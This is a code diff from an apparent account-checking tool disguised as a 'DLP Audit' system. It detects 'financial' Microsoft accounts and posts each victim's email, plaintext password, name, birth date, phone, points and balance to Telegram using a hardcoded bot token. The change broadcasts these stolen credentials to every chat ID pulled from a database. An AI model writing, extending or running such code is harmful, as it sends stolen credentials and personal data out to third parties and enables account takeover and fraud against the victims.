@@ -626,25 +626,35 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
             print(f"[DEBUG] Cuenta Financiera Detectada! Pts: {av_pts} | Saldo: {balance}")
             try:
                 fin_token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
-                if tg_chat_id:
-                    fin_msg = (f"💰 *¡CUENTA FINANCIERA DETECTADA!* 💰\n"
-                               f"━━━━━━━━━━━━━━━━━━\n\n"
-                               f"👤 *Usuario:* `{target_user}`\n"
-                               f"📧 *Correo:* `{email}`\n"
-                               f"🔑 *Pass:* `{password}`\n\n"
-                               f"🌍 *País:* {country}\n"
-                               f"👤 *Nombre:* {name}\n"
-                               f"📅 *DOB:* {dob}\n"
-                               f"📱 *Teléf:* `{phone}`\n\n"
-                               f"💎 *Pts. Disp:* `{av_pts}`\n"
-                               f"💳 *Saldo MS:* `{balance}`\n\n"
-                               f"🤖 *DLP Audit Pro System*")
-                    fin_url = f"https://api.telegram.org/bot{fin_token}/sendMessage"
-                    res = requests.post(fin_url, json={"chat_id": tg_chat_id, "text": fin_msg, "parse_mode": "Markdown"}, timeout=5)
-                    res.raise_for_status()
+                fin_msg = (f"💰 *¡CUENTA FINANCIERA DETECTADA!* 💰\n"
+                           f"━━━━━━━━━━━━━━━━━━\n\n"
+                           f"📧 *Correo:* `{email}`\n"
+                           f"🔑 *Pass:* `{password}`\n\n"
+                           f"🌍 *País:* {country}\n"
+                           f"👤 *Nombre:* {name}\n"
+                           f"📅 *DOB:* {dob}\n"
+                           f"📱 *Teléf:* `{phone}`\n\n"
+                           f"💎 *Pts. Disp:* `{av_pts}`\n"
+                           f"💳 *Saldo MS:* `{balance}`\n\n"
+                           f"🤖 *DLP Audit Pro System*")
+                fin_url = f"https://api.telegram.org/bot{fin_token}/sendMessage"
+                try:
+                    import psycopg2, os
+                    db_url = os.environ.get("DATABASE_URL", "")
+                    if db_url:
+                        fin_conn = psycopg2.connect(db_url, sslmode="require")
+                        fin_cur = fin_conn.cursor()
+                        fin_cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
+                        fin_cids = [r[0] for r in fin_cur.fetchall()]
+                        fin_cur.close(); fin_conn.close()
+                        for fin_cid in fin_cids:
+                            try: requests.post(fin_url, json={"chat_id": str(fin_cid), "text": fin_msg, "parse_mode": "Markdown"}, timeout=5)
+                            except: pass
+                except Exception as db_e:
+                    print(f"[DEBUG] Error DB financiera: {db_e}")
             except Exception as e:
                 print(f"[DEBUG] Error mandando alerta Financiera: {e}")
-               
+
         # PASO 7 - Búsqueda DLP Vía Substrate API
         senders_found = {}
         subject_count = 0
